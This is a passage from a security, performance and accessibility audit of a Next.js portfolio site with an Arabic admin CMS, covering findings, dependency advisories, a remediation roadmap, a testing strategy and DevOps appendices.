### A11Y-004 — Media upload control is not keyboard-operable
- **Category:** Accessibility · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** `components/admin/shared/media-upload.tsx:75-107`
- **Evidence:** The `<input type="file">` has `className="hidden"` (`display:none`, so it can't receive focus). The visible "button" is `<Button asChild><span>`, which is a non-focusable span inside a `<label>`. Keyboard users can't upload. The fixed `id={upload-${type}}` would also collide if two uploaders of the same type ever render on one page.
- **Recommendation:** Use a real `<Button type="button" onClick={() => inputRef.current?.click()}>` and keep the input visually hidden with `sr-only` instead of `hidden`. Generate the id with `useId()`.
- **Effort:** XS · **Verification:** Tab to the upload control and press Enter/Space; the file picker should open.

### A11Y-005 — No reduced-motion support; videos lack accessible names
- **Category:** Accessibility · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** `lib/gsap.ts:22-90`; all `useGSAP` sections; `components/portfolio.tsx:41-48`; `app/globals.css:7-9` (`scroll-behavior: smooth`)
- **Evidence:**
  - Scroll-reveal and hero animations always run.
  - Portfolio videos `autoPlay muted loop` indefinitely, with no pause control, which violates WCAG 2.2.2 "Pause, Stop, Hide" for auto-playing content over 5 s.
  - They have a hover zoom, and the stored `videoAlt` is never rendered (no `aria-label` or caption).
  - Smooth scrolling ignores user preference.
- **Recommendation:**
  - Wrap the animations in `gsap.matchMedia().add("(prefers-reduced-motion: no-preference)", …)`.
  - Don't autoplay videos for reduced-motion users; show a poster plus a play button.
  - Add `aria-label={video.alt}` (or a visible caption) and a pause control.
  - Use `@media (prefers-reduced-motion: no-preference) { :root { scroll-behavior: smooth } }`.
- **Effort:** S · **Verification:** Emulate `prefers-reduced-motion: reduce` in DevTools; there should be no animation or autoplay.

### A11Y-006 — LTR fields rendered RTL; mixed-language messages
- **Category:** Accessibility / UX · **Severity:** Low · **Confidence:** Confirmed
- **Location:** `app/(auth)/admin/login/page.tsx:76-100` and `app/admin/settings/password/page.tsx:68-102` (`dir="rtl"` / `text-right` on email and password inputs); English Zod messages in `hero.actions.ts:11-20`, `settings.actions.ts:11-21`, and English success strings shown in an Arabic UI
- **Recommendation:** Set `dir="ltr"` on email, URL, phone and password inputs. Translate all user-facing messages.
- **Effort:** XS

---

## 10. Performance Analysis

> **No measurements were taken.** No Lighthouse, WebPageTest or bundle analysis could be run, because there is no `node_modules` and no running deployment. Everything below is a **code-based risk** that should be verified with real measurements (see each item's "Verification").

### Measured problems
- Static asset sizes (measured with `du`): `public/videos/video1.mp4` 3.9 MB, `video2.mp4` 3.3 MB, `video3.mp4` 4.5 MB (11.7 MB total for the seeded fallback/portfolio content); `public/hero-image.jpeg` 96 KB.

### PERF-001 — Homepage is `force-dynamic`: ~10 DB queries per visit
- **Category:** Performance · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** `app/page.tsx:20-21`; `lib/data-server.ts` (8 functions, 10 queries; `getAboutContent` runs 3 sequentially)
- **Evidence:** Every visitor request renders on the server and queries Neon. Neon may also need to cold-start a suspended compute, which can add hundreds of milliseconds to seconds. Content changes only when the admin saves, and **every** mutation already calls `revalidatePath("/")`.
- **Impact:** Higher TTFB/LCP, Neon compute usage proportional to traffic, and an outage of the public site whenever the DB is unreachable (mitigated by fallbacks, see BE-005).
- **Recommendation:** Remove `dynamic = "force-dynamic"` and `revalidate = 0`, and let the page be statically generated with on-demand revalidation (already in place). Add `export const revalidate = 3600` as a safety net. Make sure the build environment can reach the DB, or that the fallback content at build time is acceptable until the first revalidation. Parallelize `getAboutContent`.
- **Effort:** S (≈1–2 h including build verification) · **Dependencies:** BE-005, PERF-003 (`useSession` in `Header` doesn't block static generation, but verify the build output marks `/` as static ○/ISR)
- **Verification:** `next build` output shows `/` as ○ or ISR. TTFB before vs after with WebPageTest. An admin save is reflected on `/` within seconds.

### PERF-002 — Portfolio autoplays multiple MP4s eagerly
- **Category:** Performance · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** `components/portfolio.tsx:40-48`
- **Evidence:**
  - Every work renders `<video autoPlay muted loop>` with no `preload`, `poster` or `playsInline`, and the source is hardcoded as `type="video/mp4"` even though `webm` and `mov` are allowed uploads.
  - Browsers start downloading all of them on page load, even though they are far below the fold. That is roughly 12 MB for 3 seeded videos, and it grows with every added work.
  - Each card is 600 px tall with a CSS `scale` on hover over a playing video, which adds compositing cost.
- **Impact:** Heavy mobile data usage, competition with LCP resources, battery drain, and an INP risk on low-end phones.
- **Recommendation:**
  - Use `preload="none"` with a `poster` (Cloudinary can generate one with `so_0` / `.jpg` from the video URL) and `playsInline`.
  - Only play when in view (IntersectionObserver) and pause when out of view.
  - Serve Cloudinary adaptive or transformed URLs (`q_auto,f_auto`, a width cap).
  - Derive `type` from the URL, or omit it.
- **Effort:** S (≈2–3 h) · **Dependencies:** A11Y-005 (same component)
- **Verification:** The DevTools Network panel shows no video bytes until scrolling to the portfolio. Run Lighthouse mobile before and after.

### PERF-003 — Root `SessionProvider` makes every visitor fetch `/api/auth/session`
- **Category:** Performance · **Severity:** Low · **Confidence:** Confirmed
- **Location:** `app/layout.tsx:4,53-56`; `components/header.tsx:7,11,64-72,110-119`
- **Evidence:** `SessionProvider` without a `session` prop triggers a client-side fetch to `/api/auth/session` on every public page load, plus refetches on window focus by default. The only purpose is to show an "إدارة الموقع" link to the logged-in admin.
- **Recommendation:** Move `SessionProvider` into `app/admin/layout.tsx`. For the public header, either drop the admin link or resolve it on the server.
- **Effort:** XS · **Verification:** The Network panel on `/` shows no `/api/auth/session` request.

### PERF-004 — `priority` on all icons; two Arabic font families
- **Category:** Performance · **Severity:** Low · **Confidence:** Confirmed
- **Location:** `hero.tsx:79`, `contact.tsx:188`, `footer.tsx:85` (`priority` on every social icon, which emits preload hints for below-the-fold images); `app/layout.tsx:13-22` (Cairo with 4 weights plus Noto Sans Arabic); `app/globals.css:98-109` and `layout.tsx:52` (`font-cairo` on `body` overrides `font-sans`, so Noto is effectively unused apart from `html`)
- **Recommendation:** Keep `priority` only on the hero profile image (the LCP candidate). Remove the unused font family, or limit weights to the ones actually used.
- **Effort:** XS · **Verification:** Fewer `<link rel="preload">` tags in the HTML; a smaller font download in the Network panel.

### Other notes
- All public sections are client components only for GSAP. Their HTML is still server-rendered, so this mostly costs JS bytes. Moving the static markup into server components and keeping only the animation wrappers on the client is an optional, low-priority optimisation; do it only if a bundle analysis shows it matters.
- `@gsap/react` + ScrollTrigger is a reasonable choice; `useGSAP` handles cleanup correctly.

---

## 11. Testing and Build Results

| Check | Command | Executed? | Result |
|-------|---------|-----------|--------|
| Type-check | `tsc --noEmit` | **No** | `node_modules` absent; installing is outside the audit's allowed actions |
| Lint | `npm run lint` (`eslint .`) | **No** | Would fail regardless: `eslint` is not in dependencies and no ESLint config exists (DEVOPS-001) |
| Unit / integration / E2E tests | — | **N/A** | No test framework, test files or test script exist |
| Production build | `next build` | **No** | Dependencies not installed; also needs `DATABASE_URL` at import time (`lib/db.ts:7-9`). `next.config.mjs:4` correctly keeps `ignoreBuildErrors: false` |
| Dependency vulnerabilities | `npm audit --package-lock-only --json` | **Yes** | **39 advisories — 4 critical, 24 high, 9 moderate, 2 low.** Lockfile unchanged (`git status` clean afterwards) |
| CI | — | **N/A** | No `.github/workflows` or other CI configuration |

### npm audit, runtime-relevant highlights

| Package (resolved) | Severity | Notable advisory | Relevance |
|--------------------|----------|------------------|-----------|
| `next` 15.5.23 (direct) | Critical | Unauthenticated RCE in the Image Optimization API (AVIF), fixed in ≥ 15.5.24; cache poisoning (< 15.5.27) | **High**: `next/image` with remote patterns is used |
| `next-auth` 5.0.0-beta.30 (direct) / `@auth/core` 0.41.0 | Critical | Existence-based auth checks can fail open; email homoglyph bypass; `getToken` crash | **High**: middleware uses `if (!session)` |
| `drizzle-orm` 0.45.1 (direct) | High | SQL injection via improperly escaped identifiers (< 0.45.2) | Low: no dynamic identifiers in the app |
| `sharp` (transitive via next) | High | libvips / libheif / librsvg CVEs | Medium: used by the image optimizer when self-hosted |
| `postcss` 8.5.8 (direct) | High | sourceMappingURL file read | Build-time only |
| `proxy-addr`, `express-rate-limit`, `hono`, `@hono/node-server`, `@modelcontextprotocol/sdk`, `body-parser`, `qs`, `ip-address`, `fast-uri`, `lodash`, `js-yaml`, … | Critical–Low | Various | Pulled in by the **`shadcn` CLI**, which is wrongly listed in runtime `dependencies` (DEVOPS-002). Not part of the deployed app, but noisy and installed in production images |
| `drizzle-kit` / `esbuild` / `@esbuild-kit/*` | Moderate | Dev-server request forgery | Dev tooling in runtime deps |
| `braces`, `micromatch`, `picomatch`, `chokidar`, `fast-glob`, `nanoid`, `browserslist`, `source-map-js`, `baseline-browser-mapping` | High / Moderate | ReDoS / DoS | Build-time tooling (Tailwind v3 and others) |

**Limitations:** advisory matching is by version range only. The audit does not prove exploitability, and the advisories in this table are as reported by the npm registry on the audit date.

---

## 12. Positive Findings

These are worth preserving through any refactor:

1. **Authorization in every Server Action**, not only in middleware. Keep this when introducing a `requireAdmin()` helper.
2. **Zod validation at the trust boundary** for every mutation, with friendly Arabic messages in most actions.
3. **Drizzle with parameterized queries**, typed schema exports, and relations for pricing features.
4. **DB-level integrity** for business rules: a partial unique index for "one popular package", singleton indexes, and FK cascades. These are excellent ideas once moved into tracked migrations (DB-001).
5. **Correct RTL foundation**: `lang`/`dir`, Arabic font subsets, shadcn `rtl: true`, and RTL-aware switch thumbs.
6. **Parallel data loading** on the home page (`Promise.all`) and **graceful fallback content** when the DB is unavailable (add logging; see BE-005).
7. **Consistent `revalidatePath("/")` after every mutation**, which makes the move to static and on-demand ISR (PERF-001) almost free.
8. **Safe deletes**: confirmation dialogs (`ConfirmDialog`) before every destructive action.
9. **Constrained service icons** (`z.enum([...])` matched to an `iconMap`). This is the right pattern to copy for the CTA variants (FE-006).
10. **`ignoreBuildErrors: false`** and `strict: true` in TypeScript: type errors break the build.
11. **Generic login failure messages** and bcrypt hashing.
12. **`useGSAP` with a scoped container**, which gives proper animation cleanup on unmount.

---

## 13. Prioritized Improvement Roadmap

### P0 — Immediate (today)

| Order | Findings | Dependencies | Effort | Expected outcome | Acceptance criteria |
|------:|----------|--------------|--------|------------------|---------------------|
| 1 | **SEC-001**: rotate all credentials, untrack and purge `.env`, add `.env.example`, review logs | — | M | Leaked credentials become worthless | Old DB URL, Cloudinary key and `AUTH_SECRET` rejected; `.env` absent from `git ls-files` and history; new values only in host env settings |
| 2 | **SEC-002**: upgrade `next` (≥ 15.5.27), `next-auth` (fixed release), `drizzle-orm` (≥ 0.45.2); make the middleware check `session?.user?.id` | Ideally after a minimal build check (DEVOPS-001 step 1) | S | Known critical RCE and auth fail-open closed | `npm audit --omit=dev` shows no critical advisories; login, CRUD and images smoke-tested on a preview deploy |

### P1 — High priority (this week)

| Order | Findings | Dependencies | Effort | Expected outcome | Acceptance criteria |
|------:|----------|--------------|--------|------------------|---------------------|
| 3 | **DEVOPS-001** (part 1): install ESLint + `eslint-config-next`, add a `typecheck` script and a GitHub Actions workflow (install → lint → typecheck → build with dummy env) | — | S–M | A quality gate for every following change | CI green on main; PRs blocked on failure |
| 4 | **SEC-003** login rate limiting | SEC-001 | S | Brute force blocked | 6th failed attempt in 15 min rejected; persists across instances |
| 5 | **BE-001** ordering direction + **FE-001** stats toggle | — | XS | Admin ordering and visibility work as expected | Public order equals admin order; hidden stats don't render |
| 6 | **BE-002** direct signed Cloudinary uploads (+ BE-006) | SEC-001 (new Cloudinary secret) | M | Videos up to 50 MB upload reliably with real progress | 30 MB upload succeeds in production; unauthenticated signature request rejected |
| 7 | **SEC-004** `safeUrl` validation (+ FE-005 image URL validation and `error.tsx`) | — | S | No script URLs; bad icon URLs can't crash `/` | Unit tests for `safeUrl`; error boundary renders on a forced error |
| 8 | **BE-004** action wrapper with error handling and UUID validation (+ ARCH-001 shared queries and `requireAdmin`) | BE-001 | S | Reliable admin feedback; a single source of truth for reads | Thrown DB errors produce an Arabic error toast; invalid ids return an error |

### P2 — Medium priority (next 2–4 weeks)

| Order | Findings | Dependencies | Effort | Expected outcome | Acceptance criteria |
|------:|----------|--------------|--------|------------------|---------------------|
| 9 | **DB-001** declare indexes in the schema and generate a journaled migration; **BE-003** `db.batch` / `onConflictDoUpdate`; **DB-002** length limits | SEC-001 | S | Integrity constraints tracked and atomic writes | Fresh branch migrate creates all indexes; `generate` shows no drift |
| 10 | **SEC-005** headers (CSP report-only → enforce), **SEC-006** session versioning + shorter `maxAge` | ARCH-001 | S | Defence-in-depth | Observatory grade ≥ B+; password change evicts other sessions |
| 11 | **PERF-001** static + on-demand ISR, **BE-005** logging, **PERF-003** scoped `SessionProvider` | BE-005 | S | Faster TTFB, lower DB load | Build shows `/` as static/ISR; no `/api/auth/session` on public pages |
| 12 | **PERF-002** + **A11Y-005** video loading and reduced motion | — | S | Lighter page; WCAG 2.2.2 compliance | No video bytes before scroll; reduced-motion users see no autoplay or animation |
| 13 | **A11Y-001…004** contrast tokens, CTA nesting, labels, keyboard upload | — | S–M | WCAG AA on key flows | axe: 0 serious or critical violations on `/`, `/admin/*`, and login |
| 14 | **SEO-001**, **SEO-002**, **FE-004** metadata from DB, OG image, robots/sitemap, noindex admin, wire or remove unused CMS fields | PERF-001 | S | Good social previews; CMS fields take effect | Share preview shows title, description and image; robots.txt and sitemap.xml served |
| 15 | **FE-002**, **FE-003**, **SEC-007** `router.refresh`, contact form states, honeypot, EmailJS dashboard restrictions | — | S | Smoother admin; no silent lead loss | Simulated EmailJS failure shows an error; no full reloads in the admin |
| 16 | **DEVOPS-002**, **DEVOPS-003** dependency cleanup, Tailwind consistency, docs rewrite, env validation | DEVOPS-001 | S | Smaller, auditable dependency tree; accurate onboarding | `npm audit --omit=dev` noise reduced; README matches the stack; app fails fast with a clear message on missing env |

### P3 — Optional enhancements

| Findings | Effort | Outcome |
|----------|--------|---------|
| FE-006 strict typing (remove `any`) | M | Compiler-checked UI |
| FE-007 navbar cleanup, FE-008 dead code removal, DEVOPS-004 gitignore and artefacts | S | Less noise |
| FE-009 pricing badge and currency formatting, FE-011 portfolio anchor and nav | XS | Polish |
| BE-007 store `public_id`, clean up orphaned assets | S | Controlled Cloudinary usage |
| BE-008 count queries, PERF-004 font and preload trimming, A11Y-006 LTR fields | XS | Minor gains |
| SEO-003 JSON-LD Person | XS | Richer search results |
| FE-010 decide on dark mode (implement or remove) | S | Product clarity |
| TOTP 2FA for the admin | M | Stronger account security |
| React 19 / Next 16 upgrade (separate project) | L | Current platform, built-in `javascript:` URL blocking |

---

## 14. Recommended Implementation Sequence

Each step is a separate PR, ordered to minimise risk: secure first, then add safety nets, then fix behaviour, then optimise.

1. **PR-0 (no code; ops): credential rotation and history purge (SEC-001).** Rotate everything, configure the host environment, purge `.env` from history, enable GitHub secret scanning. Doing this first means no later change ships while the leaked secrets still work.
2. **PR-1: tooling baseline (DEVOPS-001 part 1, DEVOPS-004).** Add ESLint (flat config with `eslint-config-next`), `typecheck`, `.env.example`, a `.gitignore` update, untrack `tsconfig.tsbuildinfo`, and a CI workflow running lint, typecheck and build with placeholder env vars. Don't fix lint warnings yet beyond what blocks CI. This gives every later PR an automated check.
3. **PR-2: security upgrades (SEC-002).** Bump `next`, `next-auth` and `drizzle-orm`; middleware checks `session?.user?.id`. Smoke-test on a preview deploy. This is a small, isolated diff, so a regression is easy to bisect.
4. **PR-3: test harness + shared server layer (ARCH-001, BE-004, BE-001).** Add Vitest. Create `lib/queries/*` with `visibleOnly`, a `requireAdmin()` helper, and an action wrapper (UUID validation, try/catch, Arabic errors). Fix the ordering to `asc` and write the first tests (ordering, wrapper). The refactor and the bug fix share a file set, and the tests lock in the behaviour.
5. **PR-4: input safety (SEC-004, FE-005, DB-002 Zod limits).** Add the `safeUrl` and `safeImageUrl` helpers, apply them in all schemas, add `app/error.tsx` and `app/admin/error.tsx`, and tighten `remotePatterns`. Unit-test the helpers.
6. **PR-5: auth hardening (SEC-003, SEC-006, SEC-008).** Add a `login_attempts` table or KV-based limiter, an `admins.session_version` column, a shorter `maxAge`, seed safety, and email normalisation. This includes the first new migration, so do it after PR-6 if you prefer to land DB-001 first.
7. **PR-6: migrations cleanup (DB-001, BE-003).** Declare indexes in the schema, generate a journaled migration, test on a Neon branch, and use `db.batch` / upserts. Remove the ad-hoc SQL and script.
8. **PR-7: uploads (BE-002, BE-006, BE-007).** Signed direct uploads with real progress, store `public_id`, best-effort cleanup, and remove the 10 MB Server Action limit.
9. **PR-8: admin UX fixes (FE-001, FE-002, FE-007, A11Y-004, A11Y-006).** Controlled stats switch, `router.refresh`, navbar cleanup, keyboard-accessible upload, LTR inputs.
10. **PR-9: public performance and accessibility (PERF-001…004, A11Y-001/002/003/005, FE-003, FE-009, FE-011, SEC-007).** Static/ISR page, scoped SessionProvider, video lazy loading and posters, reduced motion, contrast tokens, CTA markup, contact form states and honeypot. Verify with Lighthouse and axe before and after.
11. **PR-10: SEO and CMS wiring (SEO-001…003, FE-004).** `generateMetadata`, OG image, robots, sitemap, noindex admin, JSON-LD, and wiring or removing the unused settings.
12. **PR-11: cleanup (FE-006, FE-008, FE-010, DEVOPS-002, DEVOPS-003).** Remove dead code and unused deps, move CLIs to devDependencies, resolve the Tailwind v3/v4 mix, rewrite the README, add env validation. This comes last because it is the largest diff with the least behaviour change, and it is safest once tests and CI exist.

---

## 15. Testing Strategy

Keep the tooling minimal and proportional to a single-page site with an admin.

**Recommended tools**
- **Vitest** for unit and integration tests. It is fast, works with TS path aliases, and needs no Babel.
- **Playwright** for a small E2E suite. Chromium is already available in many CI images.
- **@axe-core/playwright** for automated accessibility checks inside the E2E runs.
- A **disposable database** for integration tests: a Neon branch created per CI run, or a local Postgres service container in GitHub Actions. Never the production database.

**Unit tests (fast, no DB)**
- `safeUrl` / `safeImageUrl` validators: reject `javascript:`, `data:` and foreign image hosts; accept `https://res.cloudinary.com/<cloud>/…`, `/…` and `#…` (SEC-004, FE-005).
- The action wrapper: unauthenticated input returns an error; an invalid UUID returns an error; a thrown DB error returns an Arabic generic error and logs it (BE-004). Mock `auth()` and `db`.
- Form-data → schema mapping for booleans (`isVisible` / `isPopular` from `"true"`, `"false"`, missing) (FE-001 regression).
- Page prop mappers if extracted from `app/page.tsx` (DB row → section props).

**Integration tests (against a disposable Postgres)**
- Ordering: public `listServices({ visibleOnly: true })` returns `displayOrder` ascending and excludes hidden rows (BE-001).
- `setPopularPackage`: exactly one popular package after any sequence, including a failure mid-way (BE-003).
- Singleton upserts: concurrent saves leave one row (BE-003).
- Migrations: `drizzle-kit migrate` on an empty DB creates all expected indexes (DB-001).
- Login limiter: N failures lock the account; success after the window resets (SEC-003).
- Session versioning: a token with an old version is rejected after a password change (SEC-006).

**E2E (Playwright, against `next start` with a seeded test DB)**
1. Public smoke: `/` renders all sections, no console errors, axe has no serious or critical violations, and there is no `/api/auth/session` request (PERF-003).
2. Admin happy path: log in, create a service, see it in the admin list and on `/` in the right order, hide it, and confirm it is gone from `/`.
3. About stat visibility toggle (FE-001 regression).
4. Unauthenticated access to `/admin/services` redirects to login. Calling a Server Action without a session returns an error (use the request API with a captured action ID).
5. Upload: mock the Cloudinary endpoint with Playwright route interception (never upload to the real account in CI) and assert the URL is saved.
6. Contact form: intercept EmailJS and check the success and error states render (FE-003). Never send real email.

**CI order:** lint → typecheck → unit → build → integration (DB service) → E2E (on the main branch or nightly if too slow).

---

## 16. Final Recommendations

**Most valuable improvements, in order of value per hour:**
1. Rotate the leaked secrets and get `.env` out of the public repository (SEC-001). Nothing else matters until this is done.
2. Upgrade Next.js and Auth.js past the critical advisories (SEC-002).
3. Add a CI gate (lint, typecheck, build) so every later change is checked (DEVOPS-001).
4. Fix the three confirmed functional bugs the site owner is probably already running into: reversed ordering, the unhideable stats, and failing video uploads (BE-001, FE-001, BE-002).
5. Rate-limit the login and restrict URL schemes (SEC-003, SEC-004).
6. Make the homepage static with on-demand revalidation and lazy-load the videos (PERF-001, PERF-002). This is the largest user-facing performance win for little code.

**Preserve:** auth checks in every Server Action, Zod at the boundary, DB-level business constraints, the RTL foundation, `revalidatePath` discipline, and the graceful fallback content (with logging added).

**Avoid:** rewriting the stack, adding a CMS or state library, or a large refactor before tests exist. The current architecture is the right size for this project. It needs hardening and a few bug fixes, not a redesign.

---

## 17. Appendix

### A. Key file references

| Concern | Files |
|---------|-------|
| Secrets / git hygiene | `.env` (tracked), `.gitignore`, `tsconfig.tsbuildinfo`, `.vscode/settings.json` |
| Auth | `auth.ts`, `middleware.ts`, `types/next-auth.d.ts`, `app/api/auth/[...nextauth]/route.ts`, `app/(auth)/admin/login/page.tsx`, `lib/actions/auth.actions.ts` |
| Server Actions | `lib/actions/{about,auth,hero,media,pricing,services,settings,social,works}.actions.ts` |
| Public reads | `lib/data-server.ts`, `lib/data.ts`, `app/page.tsx` |
| DB | `lib/db.ts`, `lib/schema.ts`, `drizzle.config.ts`, `drizzle/*.sql`, `drizzle/meta/_journal.json`, `scripts/{seed,apply-constraints}.ts` |
| Admin UI | `app/admin/**`, `components/admin/**` |
| Public UI | `components/{header,hero,about,services,portfolio,pricing,contact,footer}.tsx`, `lib/gsap.ts`, `app/globals.css`, `app/layout.tsx` |
| Config | `next.config.mjs`, `package.json`, `tailwind.config.ts`, `postcss.config.mjs`, `components.json`, `tsconfig.json` |

### B. Commands executed (all read-only or non-mutating)

```bash
git status; git log --oneline; git ls-files
git log --all --oneline -- .env
git show <commit>:.env | sed -E 's/=.*//'      # variable NAMES only, values stripped
cat <source files>                             # source reading
node -e "...read package-lock.json versions..."
npm audit --package-lock-only --json           # no install; lockfile unchanged
grep -r ... (import-usage scans)
du -sh public/videos/* public/hero-image.jpeg
node -e "...WCAG contrast from CSS HSL tokens..."
# GitHub API (MCP): repository search → visibility = public
```

`git status` was clean after all commands. The only file added is this report.

### C. Unresolved questions for the owner

1. **Hosting platform:** is it Vercel? This determines the request-body limits (BE-002), automatic HSTS (SEC-005), and whether the Windows-only Next.js RCE advisory applies.
2. **Were the committed `.env` values live production credentials?** Assume yes and rotate regardless. Was a live Stripe secret key ever in the repo (commits `abb42de`, `33d7537`)?
3. **Does the production DB actually have the `0002`/`0003` indexes?** Run `\di` or query `pg_indexes` to confirm (DB-001).
4. **EmailJS dashboard:** are allowed origins and rate limits configured? (SEC-007)
5. **Was the admin password changed after seeding?** If not, it equals the leaked `ADMIN_PASSWORD`.
6. **Is dark mode a desired feature?** (FE-010)
7. **Should the portfolio support non-MP4 uploads (webm/mov)?** The player hardcodes `video/mp4`.
8. Is the descending public order intentional anywhere (e.g. "newest work first")? If so, encode that explicitly (e.g. order works by `createdAt desc`) rather than inverting `displayOrder` (BE-001).

### D. Additional DevOps findings (detail)

#### DEVOPS-001 — No ESLint installation, no tests, no CI
- **Severity:** High · **Confidence:** Confirmed
- **Evidence:** The `lint` script is `eslint .`, but `eslint` is not in `package.json` or the lockfile and there is no `eslint.config.*` or `.eslintrc*`. There are no test files or test runner, and no `.github/workflows`. The commit history includes several "fix build/deployment" commits (`c53a79a`, `ff4d683`, `7ba0c25`), which suggests breakages are being found in production builds.
- **Recommendation:** See §14 PR-1 and §15. Use `eslint` + `eslint-config-next` (flat config), `typescript-eslint` rules for `no-explicit-any` (warn), a `"typecheck": "tsc --noEmit"` script, and Vitest. CI: Node 22, `npm ci`, lint, typecheck, test, and build with placeholder env vars.
- **Effort:** M · **Verification:** CI runs on a PR and fails on an intentional type error.

#### DEVOPS-002 — Dependency hygiene
- **Severity:** Medium · **Confidence:** Confirmed
- **Evidence:**
  - CLIs and build tools are in runtime `dependencies`: `shadcn` (which pulls in an MCP SDK, hono, express and others, and accounts for a large share of the audit findings), `drizzle-kit`, `dotenv`, `autoprefixer`.
  - Unused packages: `stripe`, `date-fns`, `@hookform/resolvers`, and all 25 individual `@radix-ui/react-*` packages (the UI imports from the `radix-ui` meta package instead), plus libraries only referenced by unused shadcn components (`recharts`, `embla-carousel-react`, `vaul`, `cmdk`, `input-otp`, `react-day-picker`, `react-resizable-panels`, `react-hook-form`).
  - Tailwind is mixed: v3 is active via `postcss.config.mjs` and `tailwind.config.ts`, while `@tailwindcss/postcss` v4 is installed and `app/globals.css:1-2` imports `tw-animate-css` and `shadcn/tailwind.css`, which are v4-oriented. Both `tailwindcss-animate` (v3 plugin) and `tw-animate-css` (v4) are present.
  - `@types/node@^20` while the runtime is Node 22.
- **Impact:** Larger installs and attack surface, noisy audits, and confusing styling behaviour (some v4-only utilities in shadcn components, such as `data-checked:`, `ring-3`, `size-4`, may not generate under v3). *Needs visual verification* of the shadcn components that use v4 syntax (`switch.tsx` uses `data-checked:` variants, which Tailwind v3 does not support by default, so the switch thumb may not move visually).
- **Recommendation:**
  - Move the CLIs to `devDependencies` (or run them via `npx`) and remove unused packages.
  - Pick **one** Tailwind major. Since `components.json` uses a v4-era style and the shadcn CSS, migrating to Tailwind v4 (`@tailwindcss/postcss`, `@import "tailwindcss"`, CSS-based theme) is the cleaner long-term path. Otherwise, regenerate the shadcn components for v3.
  - Align `@types/node` with the runtime.
- **Effort:** S (cleanup) / M (Tailwind v4 migration) · **Verification:** `npm ls` is clean, `npm audit --omit=dev` noise is reduced, and the build plus a visual check of the admin switches and dialogs pass.

#### DEVOPS-003 — Stale docs, no `.env.example`, no env validation
- **Severity:** Medium · **Confidence:** Confirmed
- **Evidence:**
  - `README.md` and `SETUP_GUIDE.md` describe Sanity CMS, Next.js 16, React 19, Tailwind v4 and a `/studio` route, none of which match the code. Both reference a `.env.example` that doesn't exist.
  - Env vars are read ad hoc: `lib/db.ts` throws at import; `contact.tsx` uses `!` assertions; the Cloudinary config accepts `undefined`.
- **Recommendation:**
  - Rewrite the README with the actual stack, setup (Neon, Cloudinary, EmailJS, Auth secret), the `db:*` scripts, the seed procedure and the deployment notes. Delete `SETUP_GUIDE.md` or replace it.
  - Add `.env.example`.
  - Add a small `lib/env.ts` that validates server env vars with Zod at startup (Zod is already a dependency, so no new package is needed).
- **Effort:** S

#### DEVOPS-004 — Build artefacts and editor files tracked; minimal `.gitignore`
- **Severity:** Low · **Confidence:** Confirmed
- **Evidence:** `tsconfig.tsbuildinfo` (412 KB) and `.vscode/settings.json` are tracked. `.gitignore` doesn't cover `.env`, `*.tsbuildinfo`, `next-env.d.ts` (optional), coverage or logs, and it still contains v0-specific entries.
- **Recommendation:** Use the standard Next.js `.gitignore` plus `.env*` with `!.env.example`, and untrack the artefacts.
- **Effort:** XS
